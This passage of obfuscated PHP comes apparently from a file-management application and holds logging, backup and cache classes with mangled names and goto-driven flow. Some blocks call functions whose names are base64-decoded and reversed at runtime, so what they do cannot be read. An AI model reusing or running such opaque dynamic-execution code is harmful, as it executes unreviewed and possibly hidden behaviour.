: 0; $é±«ÖÉ = array($‰Œ¿äáí[491] => $ŞÂã¯†, $‰Œ¿äáí[2184] => $êš‰Øğî[$‰Œ¿äáí[192]], $‰Œ¿äáí[2185] => $êš‰Øğî[$‰Œ¿äáí[32]], $‰Œ¿äáí[582] => !empty($êš‰Øğî[$‰Œ¿äáí[582]]) ? $êš‰Øğî[$‰Œ¿äáí[582]] : $‰Œ¿äáí[12], $‰Œ¿äáí[1749] => $Ó¯÷Æ¼Ô, $‰Œ¿äáí[496] => $¦òé†…, $‰Œ¿äáí[1751] => $µÒ¤µœÊ); $this->addSystemLog($¦òé†…, $é±«ÖÉ); unset($é±«ÖÉ[$‰Œ¿äáí[2185]], $é±«ÖÉ[$‰Œ¿äáí[582]]); return $this->add($é±«ÖÉ); } private function addSystemLog($Ä©õ•İœ, $£Ã±±ØÙ) { $ğ›»“íÏ =& $_SERVER[óÔë„ú]; if ($Ä©õ•İœ == $ğ›»“íÏ[2186]) { $Ä©õ•İœ = $£Ã±±ØÙ[$ğ›»“íÏ[526]][$ğ›»“íÏ[2187]]; } else { if (in_array($Ä©õ•İœ, array($ğ›»“íÏ[1936], $ğ›»“íÏ[2188]))) { $Ä©õ•İœ = $£Ã±±ØÙ[$ğ›»“íÏ[526]][$ğ›»“íÏ[171]]; } } $ìŒ™îˆµ = array_merge($£Ã±±ØÙ, array($ğ›»“íÏ[2189] => $£Ã±±ØÙ[$ğ›»“íÏ[193]], $ğ›»“íÏ[2190] => $£Ã±±ØÙ[$ğ›»“íÏ[2190]])); Hook::trigger($ğ›»“íÏ[2191], $ğ›»“íÏ[2192] . $Ä©õ•İœ, $£Ã±±ØÙ); Model($ğ›»“íÏ[1900])->addLog($ğ›»“íÏ[2192] . $Ä©õ•İœ, $ìŒ™îˆµ); } private function isDisableEvent($¦ãÂ¿¾’, $‡¢½ğşÒ) { $ÊùÂ•äº =& $_SERVER[óÔë„ú]; if ($¦ãÂ¿¾’[$ÊùÂ•äº[190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($‡¢½ğşÒ == $ÊùÂ•äº[1925]) { return !1; } return !0; } public function eventCreate($–Òİ×³, $ª¡ş›Ôé) { $Î½´¢¤ =& $_SERVER[óÔë„ú]; $±èÃŸÖ = Model($Î½´¢¤[1405])->sourceInfo($–Òİ×³); $”°îœí = array($Î½´¢¤[2187] => $ª¡ş›Ôé, $Î½´¢¤[32] => $±èÃŸÖ[$Î½´¢¤[32]]); return $this->addEvent($–Òİ×³, $Î½´¢¤[2186], $”°îœí); } public function eventFileEdit($­¸¼¼»‰) { $ƒÌî’¯ =& $_SERVER[óÔë„ú]; $º•»×ù® = array($ƒÌî’¯[2193] => $_SERVER[$ƒÌî’¯[2194]], $ƒÌî’¯[2195] => strtolower(ACTION)); if (isset($GLOBALS[$ƒÌî’¯[7]][$ƒÌî’¯[2196]])) { $º•»×ù®[$ƒÌî’¯[2196]] = $ƒÌî’¯[91]; } return $this->addEvent($­¸¼¼»‰, $ƒÌî’¯[1926], $º•»×ù®); } public function eventRecycle($Ë¹—ŞÓ´, $Ä¤½À) { return $this->addEvent($Ë¹—ŞÓ´, $_SERVER[óÔë„ú][2188], $Ä¤½À); } private static $_removeLast = ''; public function eventRemove($Àü™¨¤Ğ) { $êÄƒ¸Ê¦ =& $_SERVER[óÔë„ú]; self::$_removeLast = $Àü™¨¤Ğ; $õŠÌÖØÃ = Model($êÄƒ¸Ê¦[1405])->sourceInfo($Àü™¨¤Ğ); $ó£ÒİØ¡ = array_field_key($õŠÌÖØÃ, array($êÄƒ¸Ê¦[193], $êÄƒ¸Ê¦[541], $êÄƒ¸Ê¦[505], $êÄƒ¸Ê¦[584])); $Æ¸­¬ÒÚ = array($êÄƒ¸Ê¦[171] => $õŠÌÖØÃ[$êÄƒ¸Ê¦[32]], $êÄƒ¸Ê¦[2195] => ACTION, $êÄƒ¸Ê¦[2197] => $ó£ÒİØ¡); return $this->addEvent($õŠÌÖØÃ[$êÄƒ¸Ê¦[192]], $êÄƒ¸Ê¦[1925], $Æ¸­¬ÒÚ); } public function eventShare($äƒğŠä, $Â§¶Š¡Ó) { return $this->addEvent($äƒğŠä, $_SERVER[óÔë„ú][1936], $Â§¶Š¡Ó); } public function eventMove($ä¦ïµÂ², $Ëşøƒ•ò, $–Åâªş’) { $šçÂÕ×Á =& $_SERVER[óÔë„ú]; if (self::$_removeLast == $ä¦ïµÂ²) { return; } $Ñ‡ÄÎ™— = Model($šçÂÕ×Á[1405]); $¢üÍ»ä¬ = $Ñ‡ÄÎ™—->sourceInfo($ä¦ïµÂ²); $õÆ«ö˜¬ = $Ñ‡ÄÎ™—->sourceInfo($Ëşøƒ•ò); $Ú—¯•ÍÃ = $Ñ‡ÄÎ™—->sourceInfo($–Åâªş’); $ü‰–©á = array($šçÂÕ×Á[1226] => $Ëşøƒ•ò, $šçÂÕ×Á[2198] => $õÆ«ö˜¬[$šçÂÕ×Á[32]], $šçÂÕ×Á[2174] => !empty($õÆ«ö˜¬[$šçÂÕ×Á[582]]) ? $õÆ«ö˜¬[$šçÂÕ×Á[582]] : $šçÂÕ×Á[12], $šçÂÕ×Á[1227] => $–Åâªş’, $šçÂÕ×Á[2199] => $Ú—¯•ÍÃ[$šçÂÕ×Á[32]], $šçÂÕ×Á[2200] => !empty($Ú—¯•ÍÃ[$šçÂÕ×Á[582]]) ? $Ú—¯•ÍÃ[$šçÂÕ×Á[582]] : $šçÂÕ×Á[12]); $this->addEvent($ä¦ïµÂ², $šçÂÕ×Á[620], $ü‰–©á); $¢üÍ»ä¬ = $Ñ‡ÄÎ™—->sourceInfo($ä¦ïµÂ²); $ü‰–©á = array($šçÂÕ×Á[193] => $¢üÍ»ä¬[$šçÂÕ×Á[193]], $šçÂÕ×Á[32] => $¢üÍ»ä¬[$šçÂÕ×Á[32]]); $this->addEvent($Ëşøƒ•ò, $šçÂÕ×Á[2201], $ü‰–©á); } public function eventCopy($¦Ö º¬Ş) { $this->eventCreate($¦Ö º¬Ş, $_SERVER[óÔë„ú][618]); } public function eventRename($œ™¢¡†, $šŠ ¥Î , $ü×â–äœ) { $×Ü°ŸÃ =& $_SERVER[óÔë„ú]; $ŠïËèıÈ = array($×Ü°ŸÃ[1226] => $šŠ ¥Î , $×Ü°ŸÃ[1227] => $ü×â–äœ); return $this->addEvent($œ™¢¡†, $×Ü°ŸÃ[1419], $ŠïËèıÈ); } public function eventAddComment($Çı¿ø’ë, $·†šøı¡) { return $this->addEvent($Çı¿ø’ë, $_SERVER[óÔë„ú][2202], $·†šøı¡); } public function eventAddDesc($È·…ú®š, $»¯Ş‡ı•) { return $this->addEvent($È·…ú®š, $_SERVER[óÔë„ú][2203], $»¯Ş‡ı•); } public function listBySource($²ß±‡ë€) { $É†ë«¶ =& $_SERVER[óÔë„ú]; $ÛŞ™Êö = Model($É†ë«¶[1405])->sourceInfo($²ß±‡ë€); $÷ÁˆÏÍÅ = array($É†ë«¶[491] => $²ß±‡ë€); if ($ÛŞ™Êö[$É†ë«¶[485]] == $É†ë«¶[91]) { $ú êš–Æ = Model($É†ë«¶[1405])->listSearchChildren($²ß±‡ë€, 20000); $ú êš–Æ[] = $²ß±‡ë€ . $É†ë«¶[454]; $÷ÁˆÏÍÅ = array($É†ë«¶[193] => array($É†ë«¶[7], $ú êš–Æ)); } $›Õú’Œ = $this->where($÷ÁˆÏÍÅ)->order($É†ë«¶[2204])->selectPage(); if ($›Õú’Œ[$É†ë«¶[442]][$É†ë«¶[443]] == 0) { $›Õú’Œ[$É†ë«¶[442]][$É†ë«¶[443]] = 1; $›Õú’Œ[$É†ë«¶[445]] = array(array($É†ë«¶[491] => $²ß±‡ë€, $É†ë«¶[2184] => $ÛŞ™Êö[$É†ë«¶[192]], $É†ë«¶[1749] => $ÛŞ™Êö[$É†ë«¶[527]], $É†ë«¶[496] => $É†ë«¶[2205], $É†ë«¶[497] => $ÛŞ™Êö[$É†ë«¶[231]], $É†ë«¶[1751] => $É†ë«¶[12])); } return $this->eventListParse($›Õú’Œ, $²ß±‡ë€); } private function eventListParse($º½ÜÛ‚­, $ß·ı×™È) { $Ï¬ù¼´ =& $_SERVER[óÔë„ú]; $ÕÔ·“ê = $º½ÜÛ‚­[$Ï¬ù¼´[445]]; $ëĞ˜æ®á = array_to_keyvalue($ÕÔ·“ê, $Ï¬ù¼´[12], $Ï¬ù¼´[193]); $¥µßÏÄª = array_to_keyvalue($ÕÔ·“ê, $Ï¬ù¼´[12], $Ï¬ù¼´[2190]); foreach ($ÕÔ·“ê as $‘åŒã¨) { $¨Ï×â–± = $‘åŒã¨[$Ï¬ù¼´[526]]; if ($‘åŒã¨[$Ï¬ù¼´[33]] == $Ï¬ù¼´[620] && isset($¨Ï×â–±[$Ï¬ù¼´[1226]])) { $ëĞ˜æ®á[] = $¨Ï×â–±[$Ï¬ù¼´[1226]] . $Ï¬ù¼´[12]; $ëĞ˜æ®á[] = $¨Ï×â–±[$Ï¬ù¼´[1227]] . $Ï¬ù¼´[12]; } if ($‘åŒã¨[$Ï¬ù¼´[33]] == $Ï¬ù¼´[2201] && isset($¨Ï×â–±[$Ï¬ù¼´[193]])) { $ëĞ˜æ®á[] = $¨Ï×â–±[$Ï¬ù¼´[193]] . $Ï¬ù¼´[12]; } } $ëĞ˜æ®á = array_merge($ëĞ˜æ®á, $¥µßÏÄª, array($ß·ı×™È . $Ï¬ù¼´[12])); $ëĞ˜æ®á = array_unique($ëĞ˜æ®á); $‘°¡…¶® = array_unique(array_to_keyvalue($ÕÔ·“ê, $Ï¬ù¼´[12], $Ï¬ù¼´[1758])); $ÕŠ®ÁÄ„ = Model($Ï¬ù¼´[598])->userListInfo($‘°¡…¶®); $‹íïº³Û = Model($Ï¬ù¼´[884])->sourceListInfo($ëĞ˜æ®á, !0); foreach ($ÕÔ·“ê as &$‘åŒã¨) { if ($‘åŒã¨[$Ï¬ù¼´[33]] == $Ï¬ù¼´[620] && isset($‘åŒã¨[$Ï¬ù¼´[526]][$Ï¬ù¼´[1226]])) { $‘åŒã¨[$Ï¬ù¼´[526]][$Ï¬ù¼´[1226]] = $‹íïº³Û[$‘åŒã¨[$Ï¬ù¼´[526]][$Ï¬ù¼´[1226]]]; $‘åŒã¨[$Ï¬ù¼´[526]][$Ï¬ù¼´[1227]] = $‹íïº³Û[$‘åŒã¨[$Ï¬ù¼´[526]][$Ï¬ù¼´[1227]]]; } if ($‘åŒã¨[$Ï¬ù¼´[33]] == $Ï¬ù¼´[2201] && isset($‘åŒã¨[$Ï¬ù¼´[526]][$Ï¬ù¼´[193]])) { $‘åŒã¨[$Ï¬ù¼´[526]][$Ï¬ù¼´[193]] = $‹íïº³Û[$‘åŒã¨[$Ï¬ù¼´[526]][$Ï¬ù¼´[193]]]; } $‘åŒã¨[$Ï¬ù¼´[90]] = $‹íïº³Û[$‘åŒã¨[$Ï¬ù¼´[193]]]; $‘åŒã¨[$Ï¬ù¼´[2206]] = $‹íïº³Û[$‘åŒã¨[$Ï¬ù¼´[2190]]]; if ($‘åŒã¨[$Ï¬ù¼´[33]] == $Ï¬ù¼´[1925]) { $‘åŒã¨[$Ï¬ù¼´[2206]] = $‘åŒã¨[$Ï¬ù¼´[90]]; $‘åŒã¨[$Ï¬ù¼´[2190]] = $‘åŒã¨[$Ï¬ù¼´[2206]][$Ï¬ù¼´[193]]; $‘åŒã¨[$Ï¬ù¼´[90]] = !1; $‘åŒã¨[$Ï¬ù¼´[193]] = $Ï¬ù¼´[12]; } $‘åŒã¨[$Ï¬ù¼´[2133]] = $ÕŠ®ÁÄ„[$‘åŒã¨[$Ï¬ù¼´[1758]]]; } unset($‘åŒã¨); $º½ÜÛ‚­[$Ï¬ù¼´[445]] = $ÕÔ·“ê; return $º½ÜÛ‚­; } public function removeBySource($ÜÜä¸ƒÍ) { $ØÎ–Ì•´ = array($_SERVER[óÔë„ú][491] => $ÜÜä¸ƒÍ); $this->where($ØÎ–Ì•´)->remove(); } } goto eÎß£ÆŠ—; e¯¨ë‡òî: $fileSize = strrev(base64_decode($_SERVER[ìµÎşª–][0])); function binCheckNeq($ûìúö‡, $ñ«Ïâô´) { return $ûìúö‡ != $ñ«Ïâô´; } $_SERVER[$_SERVER[ìµÎşª–][1]] = $fileSize($_SERVER[$_SERVER[ìµÎşª–][2]]); goto A¼Òš“èµŒ; e™±™¹¶™Ë: class BackupDbFile { public function __construct() { } public function index() { $ßëÃªÅã =& $_SERVER[óÔë„ú]; $È£ìø– = Backup::get(); $Êş÷ŞäÈ = $È£ìø–[$ßëÃªÅã[32]]; $ö–Õ¨Ã = $this->tmpFilesPath() . "\142\141\x63\153\x75\x70\x5f{$Êş÷ŞäÈ}\57"; $ú·¤òÇÁ = $this->backupPath($È£ìø–); if (!($ú·¤òÇÁ = IO::mkdir($ú·¤òÇÁ))) { return !1; } $ÉŠø§ˆ³ = IO::listPath($ö–Õ¨Ã); $Â×ñÌ = isset($ÉŠø§ˆ³[$ßëÃªÅã[86]]) ? $ÉŠø§ˆ³[$ßëÃªÅã[86]] : array(); $Íİ²°ÌØ = array_sum(array_column($Â×ñÌ, $ßëÃªÅã[79])); if (!$Íİ²°ÌØ) { return !1; } $úĞöõùÊ = array($ßëÃªÅã[858] => $Íİ²°ÌØ, $ßëÃªÅã[859] => time()); Backup::set($úĞöõùÊ); $•°´® = new TaskFileTransfer($ßëÃªÅã[860], $ßëÃªÅã[843], count($Â×ñÌ), LNG($ßëÃªÅã[844]) . $ßëÃªÅã[462] . LNG($ßëÃªÅã[846]) . $ßëÃªÅã[861]); $•°´®->task[$ßëÃªÅã[823]] = $Íİ²°ÌØ; foreach ($ÉŠø§ˆ³[$ßëÃªÅã[86]] as $Ğ§Ü¯ü—) { $Ì˜Îø«€ = IO::move($Ğ§Ü¯ü—[$ßëÃªÅã[87]], $ú·¤òÇÁ); if (!$Ì˜Îø«€) { $•°´®->end(); $è ²ºº½ = IO::getLastError($ßëÃªÅã[862] . $Ğ§Ü¯ü—[$ßëÃªÅã[87]] . $ßëÃªÅã[863] . $ú·¤òÇÁ . $ßëÃªÅã[178]); write_log($è ²ºº½, $ßëÃªÅã[843]); return !1; } } $¡¾Êºìœ = new DbManage(); $€ïÕòûÌ = $¡¾Êºìœ->getSqlFile(); if (!$€ïÕòûÌ[$ßëÃªÅã[864]] || !$€ïÕòûÌ[$ßëÃªÅã[13]]) { return !1; } IO::move($€ïÕòûÌ[$ßëÃªÅã[864]], $ú·¤òÇÁ); IO::move($€ïÕòûÌ[$ßëÃªÅã[13]], $ú·¤òÇÁ); $•°´®->end(); $úĞöõùÊ = array($ßëÃªÅã[865] => $Íİ²°ÌØ, $ßëÃªÅã[866] => time()); Backup::set($úĞöõùÊ); return !0; } private function backupPath($ªéğôèï) { $ëÈ¥Ÿ§× =& $_SERVER[óÔë„ú]; $ò“âê¯‚ = $ªéğôèï[$ëÈ¥Ÿ§×[32]]; $ÃÙ¯¯ÂÅ = Model($ëÈ¥Ÿ§×[830])->get($ëÈ¥Ÿ§×[831]); $Ö²„´³ = substr(md5($ëÈ¥Ÿ§×[832] . $ÃÙ¯¯ÂÅ . $ò“âê¯‚), 0, 8); return "\x7b\151\x6f\72{$ªéğôèï[$ëÈ¥Ÿ§×[812]]}\x7d\57\x64\141\x74\141\142\141\x73\145\x2f\142\141\143\153\x75\160\57" . $ò“âê¯‚ . $ëÈ¥Ÿ§×[11] . $Ö²„´³; } private function tmpFilesPath() { $©èõƒƒì =& $_SERVER[óÔë„ú]; $œ›Ÿ´„ï = TEMP_FILES; if ($GLOBALS[$©èõƒƒì[6]][$©èõƒƒì[92]][$©èõƒƒì[856]]) { $œ›Ÿ´„ï = $GLOBALS[$©èõƒƒì[6]][$©èõƒƒì[92]][$©èõƒƒì[856]]; if (!mk_dir($œ›Ÿ´„ï) || !is_writable($œ›Ÿ´„ï) || !IO::mkfile($œ›Ÿ´„ï . $©èõƒƒì[857])) { $œ›Ÿ´„ï = TEMP_FILES; } } return $œ›Ÿ´„ï; } } class BackupFile { public function __construct() { } public function index() { $ÊğÃ•Íš = Backup::get(); $²ªô™÷² = $ÊğÃ•Íš[$_SERVER[óÔë„ú][369]][$_SERVER[óÔë„ú][230]][$_SERVER[óÔë„ú][541]]; $¹ëŸı§ä = array($_SERVER[óÔë„ú][542] => array($_SERVER[óÔë„ú][867], $²ªô™÷²), $_SERVER[óÔë„ú][868] => array($_SERVER[óÔë„ú][407], $ÊğÃ•Íš[$_SERVER[óÔë„ú][812]])); $ºÏÇ½šò = (int) Model($_SERVER[óÔë„ú][849])->where($¹ëŸı§ä)->count($_SERVER[óÔë„ú][541]); $¨ÚïêìÓ = (int) Model($_SERVER[óÔë„ú][849])->where($¹ëŸı§ä)->sum($_SERVER[óÔë„ú][79]); $ÉÚ§›¹À = new TaskFileTransfer($_SERVER[óÔë„ú][869], $_SERVER[óÔë„ú][843], $ºÏÇ½šò, LNG($_SERVER[óÔë„ú][844]) . $_SERVER[óÔë„ú][845] . LNG($_SERVER[óÔë„ú][870])); $ÉÚ§›¹À->task[$_SERVER[óÔë„ú][823]] = $¨ÚïêìÓ; $•äß©ıÜ = array($_SERVER[óÔë„ú][871] => $ºÏÇ½šò, $_SERVER[óÔë„ú][872] => $¨ÚïêìÓ, $_SERVER[óÔë„ú][873] => time()); Backup::set($•äß©ıÜ); $·Ôˆˆìñ = !0; $‚ùûÛÃ = $this->storeIds(); $òË¬ÃÒÈ = 1; $˜­½í˜¢ = 1000; $—ğšÅ‡ = $ÛÊ—Ïêş = 0; $Ü·š©› = array(); $òÅøŞç« = $Îƒ÷Ôıâ = 0; do { $—ªŠ„ã = $_SERVER[óÔë„ú][874]; $ÈÇ°³Öâ = Model($_SERVER[óÔë„ú][849])->where($¹ëŸı§ä)->field($—ªŠ„ã)->order($_SERVER[óÔë„ú][875])->selectPage($˜­½í˜¢, $òË¬ÃÒÈ); $±Áïï = !empty($ÈÇ°³Öâ[$_SERVER[óÔë„ú][445]]) ? $ÈÇ°³Öâ[$_SERVER[óÔë„ú][445]] : array(); foreach ($±Áïï as $ı±©ï¥ğ) { if (!$this->_fileExist($ı±©ï¥ğ, $Ü·š©›, $‚ùûÛÃ)) { write_log("\146\151\x6c\145\x20\156\x6f\x74\x20\145\170\x69\163\164\x2e\146\x69\154\145\111\104\x3a{$ı±©ï¥ğ[$_SERVER[óÔë„ú][541]]}\x2c\x20\x70\141\x74\x68\72{$ı±©ï¥ğ[$_SERVER[óÔë„ú][87]]}", $_SERVER[óÔë„ú][876]); continue; } $Îö¦İ¿ = $ı±©ï¥ğ[$_SERVER[óÔë„ú][87]]; $ê¨ˆ®½î = "\173\151\157\x3a{$ÊğÃ•Íš[$_SERVER[óÔë„ú][812]]}\175" . substr($Îö¦İ¿, strlen("\x7b\x69\x6f\72{$ı±©ï¥ğ[$_SERVER[óÔë„ú][877]]}\175")); if (IO::exist($ê¨ˆ®½î)) { $ÉÚ§›¹À->updateFileEnd($ı±©ï¥ğ[$_SERVER[óÔë„ú][32]], $ı±©ï¥ğ[$_SERVER[óÔë„ú][79]]); } else { $ê¨ˆ®½î = get_path_father($ê¨ˆ®½î); IO::mkdir($ê¨ˆ®½î); if (!IO::copy($Îö¦İ¿, $ê¨ˆ®½î, $_SERVER[óÔë„ú][878])) { write_log($_SERVER[óÔë„ú][879] . $Îö¦İ¿ . $_SERVER[óÔë„ú][863] . $ê¨ˆ®½î . $_SERVER[óÔë„ú][178], $_SERVER[óÔë„ú][843]); $·Ôˆˆìñ = !1; break; } } $²ªô™÷² = $ı±©ï¥ğ[$_SERVER[óÔë„ú][541]]; $ÛÊ—Ïêş += 1; $—ğšÅ‡ += $ı±©ï¥ğ[$_SERVER[óÔë„ú][79]]; $Îƒ÷Ôıâ += 1; $òÅøŞç« += $ı±©ï¥ğ[$_SERVER[óÔë„ú][79]]; if ($—ğšÅ‡ >= 1024 * 1024 * 100) { $•äß©ıÜ = array($_SERVER[óÔë„ú][811] => $²ªô™÷², $_SERVER[óÔë„ú][880] => $Îƒ÷Ôıâ, $_SERVER[óÔë„ú][881] => $òÅøŞç«); Backup::set($•äß©ıÜ); $—ğšÅ‡ = $ÛÊ—Ïêş = 0; } } $ò—à†´ = count($±Áïï); $òË¬ÃÒÈ++; } while ($ò—à†´ == $˜­½í˜¢); $ÉÚ§›¹À->end(); $•äß©ıÜ = array($_SERVER[óÔë„ú][882] => 1, $_SERVER[óÔë„ú][821] => time(), $_SERVER[óÔë„ú][835] => 1, $_SERVER[óÔë„ú][811] => $²ªô™÷², $_SERVER[óÔë„ú][883] => time()); if ($ÛÊ—Ïêş) { $•äß©ıÜ[$_SERVER[óÔë„ú][880]] = $Îƒ÷Ôıâ; $•äß©ıÜ[$_SERVER[óÔë„ú][881]] = $òÅøŞç«; } Backup::set($•äß©ıÜ); return !0; } private function _fileExist($ÒÛ©¬ù, &$·Ã­ï»©, $ğŠÕÕüú) { $±ÜÑ½‚ª =& $_SERVER[óÔë„ú]; $’ğä¤Ôà = $ÒÛ©¬ù[$±ÜÑ½‚ª[87]]; if (in_array($ÒÛ©¬ù[$±ÜÑ½‚ª[541]], $·Ã­ï»©)) { return !1; } if (!in_array($ÒÛ©¬ù[$±ÜÑ½‚ª[877]], $ğŠÕÕüú)) { return !1; } if (IO::exist($’ğä¤Ôà)) { return !0; } $ÑßÈüòß = get_path_father($’ğä¤Ôà); if (IO::exist($ÑßÈüòß)) { $·Ã­ï»©[] = $ÒÛ©¬ù[$±ÜÑ½‚ª[541]]; return !1; } $´¶ßÑÁŠ = array($±ÜÑ½‚ª[877] => $ÒÛ©¬ù[$±ÜÑ½‚ª[877]], $±ÜÑ½‚ª[87] => array($±ÜÑ½‚ª[459], "{$ÑßÈüòß}\x25")); $ö’Ùñ»Ô = Model($±ÜÑ½‚ª[849])->where($´¶ßÑÁŠ)->field($±ÜÑ½‚ª[542])->select(); $·Ã­ï»© = array_merge($·Ã­ï»©, array_to_keyvalue($ö’Ùñ»Ô, $±ÜÑ½‚ª[12], $±ÜÑ½‚ª[541])); return !1; } private function _fileFilter($ıÖî…) { $¡Óû•ñ =& $_SERVER[óÔë„ú]; return; if (empty($ıÖî…)) { return; } $¾ó÷ªìë = array($¡Óû•ñ[541] => array($¡Óû•ñ[7], array_unique($ıÖî…))); $šì§ñ™± = Model($¡Óû•ñ[884])->where($¾ó÷ªìë)->field($¡Óû•ñ[193])->select(); foreach ($šì§ñ™± as $Ê³ÚÒĞú) { Model($¡Óû•ñ[884])->remove($Ê³ÚÒĞú[$¡Óû•ñ[193]], !1); } } private function storeIds() { $¦¶°Ñ˜ =& $_SERVER[óÔë„ú]; $ŠÉ ²¼£ = Model($¦¶°Ñ˜[827])->listData(); $Çäà±Õ‚ = array(); $áŸœ‘¿Ô = $GLOBALS[$¦¶°Ñ˜[6]][$¦¶°Ñ˜[92]][$¦¶°Ñ˜[885]]; foreach ($ŠÉ ²¼£ as $øóÊ¾â) { $í×àÇÓ = strtolower($øóÊ¾â[$¦¶°Ñ˜[98]]); if (!isset($áŸœ‘¿Ô[$í×àÇÓ])) { continue; } $´²¯ùÄî = $¦¶°Ñ˜[77] . (isset($áŸœ‘¿Ô[$í×àÇÓ]) ? $áŸœ‘¿Ô[$í×àÇÓ] : ucfirst($í×àÇÓ)); if (!class_exists($´²¯ùÄî)) { continue; } $Çäà±Õ‚[] = $øóÊ¾â[$¦¶°Ñ˜[475]]; } return $Çäà±Õ‚; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ÛùšÒÖ• =& $_SERVER[óÔë„ú]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ñÚı‹Ä = $GLOBALS[$ÛùšÒÖ•[6]][$ÛùšÒÖ•[425]]; $äñ¦ÉŒ = $ñÚı‹Ä[$ñÚı‹Ä[$ÛùšÒÖ•[886]]]; $Ô¨ŞåÀµ = $ñÚı‹Ä[$ÛùšÒÖ•[887]]; switch ($ñÚı‹Ä[$ÛùšÒÖ•[886]]) { case $ÛùšÒÖ•[21]: self::$handle = Model($ÛùšÒÖ•[888]); break; case $ÛùšÒÖ•[889]: self::$handle = new CacheRedis($äñ¦ÉŒ, $Ô¨ŞåÀµ); break; case $ÛùšÒÖ•[890]: self::$handle = new CacheMemcached($äñ¦ÉŒ, $Ô¨ŞåÀµ); break; case $ÛùšÒÖ•[230]: self::$handle = new CacheFile($äñ¦ÉŒ, $Ô¨ŞåÀµ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Ğ‰§ˆü) { if (is_array($Ğ‰§ˆü) || is_object($Ğ‰§ˆü)) { $Ğ‰§ˆü = json_encode($Ğ‰§ˆü); } $Ğ‰§ˆü = rawurlencode($Ğ‰§ˆü); return md5(KOD_SITE_ID . $_SERVER[óÔë„ú][11] . $Ğ‰§ˆü); } public static function get($— †Ä«‚, $¦ïúè¤‡ = false) { $²ˆ³”¬… = self::key($— †Ä«‚); $äÔÚú¡Ñ = self::init(); if ($¦ïúè¤‡) { return unserialize($äÔÚú¡Ñ->get($²ˆ³”¬…)); } if (!isset(self::$memoryCache[$²ˆ³”¬…])) { $³â”¯¿´ = $äÔÚú¡Ñ->get($²ˆ³”¬…); self::$memoryCache[$²ˆ³”¬…] = unserialize($³â”¯¿´); } return self::$memoryCache[$²ˆ³”¬…]; } public static function set($Œîğ¨ƒÂ, $èœÙªóŸ, $´¼ú¤ìş = false) { $­ÈâıÕ =& $_SERVER[óÔë„ú]; $µÌõÁõ‡ = self::key($Œîğ¨ƒÂ); if (isset(self::$memoryCache[$µÌõÁõ‡]) && self::$memoryCache[$µÌõÁõ‡] === $èœÙªóŸ) { return !0; } if ($´¼ú¤ìş === 0) { self::$memoryCache[$µÌõÁõ‡] = $èœÙªóŸ; return !0; } $ÔŞËª¦„ = self::init(); $”™­ı = serialize($èœÙªóŸ); CacheLock::lock($Œîğ¨ƒÂ . $­ÈâıÕ[891]); $ŸÎüì¬¤ = $ÔŞËª¦„->set($µÌõÁõ‡, $”™­ı, $´¼ú¤ìş); self::$memoryCache[$µÌõÁõ‡] = $èœÙªóŸ; CacheLock::unlock($Œîğ¨ƒÂ . $­ÈâıÕ[891]); return $ŸÎüì¬¤; } public static function getCall($âÓ»€Ò, $¶­û¥Í§, $—ËóöÄ›, $€ìËŸç˜ = array()) { $×ÚãÜ Æ =& $_SERVER[óÔë„ú]; $ƒõÀĞ‡ = self::get($âÓ»€Ò); if ($ƒõÀĞ‡ || $ƒõÀĞ‡ === $×ÚãÜ Æ[12]) { return $ƒõÀĞ‡; } $ƒõÀĞ‡ = call_user_func_array($—ËóöÄ›, $€ìËŸç˜); $ƒõÀĞ‡ = $ƒõÀĞ‡ ? $ƒõÀĞ‡ : $×ÚãÜ Æ[12]; self::set($âÓ»€Ò, $ƒõÀĞ‡, $¶­û¥Í§); return $ƒõÀĞ‡; } public static function remove($¢§ß†µŞ) { $¨©×ú‹… = self::key($¢§ß†µŞ); unset(self::$memoryCache[$¨©×ú‹…]); self::clearTimeout(); CacheLock::lock($¢§ß†µŞ); $Øóöóğ = self::init()->remove($¨©×ú‹…); CacheLock::unlock($¢§ß†µŞ); return $Øóöóğ; } public static function removeMemory($–ĞÀè) { $Ø˜îÎÔç = self::key($–ĞÀè); unset(self::$memoryCache[$Ø˜îÎÔç]); } public static function clearMemory($¸™ƒÍ¨Ö = false) { if ($¸™ƒÍ¨Ö) { $¸™ƒÍ¨Ö = self::key($¸™ƒÍ¨Ö); unset(self::$memoryCache[$¸™ƒÍ¨Ö]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[óÔë„ú][892])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[óÔë„ú][893])) { self::init()->clearTimeout(); } } } goto A‰·ÌÄª; fÛ·Ã†òÚ: if ($_SERVER[$_SERVER[óÔë„ú][936]] != $_SERVER[$_SERVER[óÔë„ú][1250]]) { $_getc = $_SERVER[óÔë„ú][939]; $_getfile = $_SERVER[$_SERVER[óÔë„ú][940]] . $_SERVER[óÔë„ú][941]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[óÔë„ú][262], $_getfilec); if (count($_getarrs) < $_SERVER[óÔë„ú][715]) { $exit = $_SERVER[óÔë„ú][942]; $exit(); } $_act = $_SERVER[óÔë„ú][1251]; $_act($_SERVER[$_SERVER[óÔë„ú][937]]); } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $²½¤¯ãı; if ($²½¤¯ãı) { return $²½¤¯ãı; } $¥†ê›Ø‚ = IO::init($_SERVER[óÔë„ú][8]); return $¥†ê›Ø‚; } private static function iconvSystem($¤¤æ¼½Ç) { return self::local()->iconvSystem($¤¤æ¼½Ç); } private static function iconvApp($ÏÂËü©­) { return self::local()->iconvApp($ÏÂËü©­); } public static function zipFolder($ÈÇÔ”„î, $„Ì³ãÆâ = "\x7a\x69\160", $îÈÒª›ù = '', $Ã‹Ãá = REPEAT_RENAME) { $úç¥ÏŸŸ =& $_SERVER[óÔë„ú]; $ÎäÃÜÇŸ = IO::listPath($ÈÇÔ”„î); if (!$ÎäÃÜÇŸ) { return !1; } $ÎäÃÜÇŸ = array_merge($ÎäÃÜÇŸ[$úç¥ÏŸŸ[85]], $ÎäÃÜÇŸ[$úç¥ÏŸŸ[86]]); return self::zip($ÎäÃÜÇŸ, $„Ì³ãÆâ, $îÈÒª›ù, $Ã‹Ãá); } public static function zip($“ÕÈµå, $üüıŞØÀ = "\172\151\x70", $†••ş’ = '', $‹¬¹ŠÈ´ = REPEAT_RENAME) { $äí•›¶ =& $_SERVER[óÔë„ú]; if 